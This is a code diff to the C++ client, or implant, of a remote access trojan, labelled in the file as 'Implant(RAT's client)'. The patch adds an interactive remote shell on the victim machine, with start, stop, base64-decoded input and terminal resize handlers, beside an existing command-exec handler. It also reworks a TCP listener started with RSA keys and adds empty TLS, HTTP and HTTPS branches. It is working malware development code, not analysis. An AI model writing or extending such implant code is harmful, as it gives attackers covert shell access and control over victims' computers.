@@ -34,6 +34,7 @@ Introduction: Implant(RAT's client).
 #include "clsProcMgr.hpp"
 #include "clsServMgr.hpp"
 #include "clsLoader.hpp"
+#include "clsShell.hpp"
 
 #include "clsLtnTcp.hpp"
 
@@ -53,6 +54,7 @@ enum enConnectionMethod
 };
 
 clsLtnTcp* g_ltpTcp = nullptr;
+clsShell* g_shell = nullptr;
 
 void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::string>& vuMsg)
 {
@@ -359,15 +361,54 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
         {
             if (vsMsg[1] == "start")
             {
+                if (g_shell)
+                {
+                    g_shell->fnStop();
+                    g_shell = nullptr;
+                }
 
+                if (!g_shell)
+                {
+                    g_shell = new clsShell(victim);
+                    g_shell->fnStart();
+                }
             }
             else if (vsMsg[1] == "stop")
             {
+                if (g_shell)
+                {
+                    g_shell->fnStop();
+                    g_shell = nullptr;
+                }
+            }
+            else if (vsMsg[1] == "input")
+            {
+                if (!g_shell)
+                {
+                    clsTools::fnLogErr("g_shell == nullptr");
+                    return;
+                }
 
+                auto bytes = clsEZData::fnb64Decode(vsMsg[2]);
+                g_shell->fnPushInput(bytes);
+            }
+            else if (vsMsg[1] == "resize")
+            {
+                if (!g_shell)
+                {
+                    clsTools::fnLogErr("g_shell == nullptr");
+                    return;
+                }
+
+                int nCol = std::stoi(vsMsg[2]);
+                int nRow = std::stoi(vsMsg[3]);
+
+                g_shell->fnResize(nCol, nRow);
             }
             else if (vsMsg[1] == "exec")
             {
                 std::string szOutput = clsTools::fnExec(vsMsg[2]);
+
             }
         }
         else if (vsMsg[0] == "loader") //Plugin Loader.
@@ -382,26 +423,42 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
             }
             else if (vsMsg[1] == "start")
             {
-                int nPort = std::stoi(vsMsg[2]);
-                STR szRSAPublicKey = vsMsg[3];
-                STR szRSAPrivateKey = vsMsg[4];
 
-                if (g_ltpTcp != nullptr)
+                if (vsMsg[2] == "TCP")
                 {
-                    if (!g_ltpTcp->m_bListening)
+                    int nPort = std::stoi(vsMsg[3]);
+                    STR szRSAPublicKey = vsMsg[4];
+                    STR szRSAPrivateKey = vsMsg[5];
+
+                    if (g_ltpTcp != nullptr)
                     {
-                        //todo: write log.
-                        g_ltpTcp->fnStop();
+                        if (!g_ltpTcp->m_bListening)
+                        {
+                            //todo: write log.
+                            g_ltpTcp->fnStop();
+                        }
+
+                        delete g_ltpTcp;
+                        g_ltpTcp = nullptr;
                     }
 
-                    delete g_ltpTcp;
-                    g_ltpTcp = nullptr;
+                    g_ltpTcp = new clsLtnTcp(victim, nPort, szRSAPublicKey, szRSAPrivateKey);
+                    std::thread([]() {
+                        g_ltpTcp->fnStart();
+                    }).detach();
                 }
+                else if (vsMsg[2] == "TLS")
+                {
 
-                g_ltpTcp = new clsLtnTcp(victim, nPort, szRSAPublicKey, szRSAPrivateKey);
-                std::thread([]() {
-                    g_ltpTcp->fnStart();
-                }).detach();
+                }
+                else if (vsMsg[2] == "HTTP")
+                {
+
+                }
+                else if (vsMsg[2] == "HTTPS")
+                {
+                    
+                }
 
                 STRLIST ls = {
                     "server",
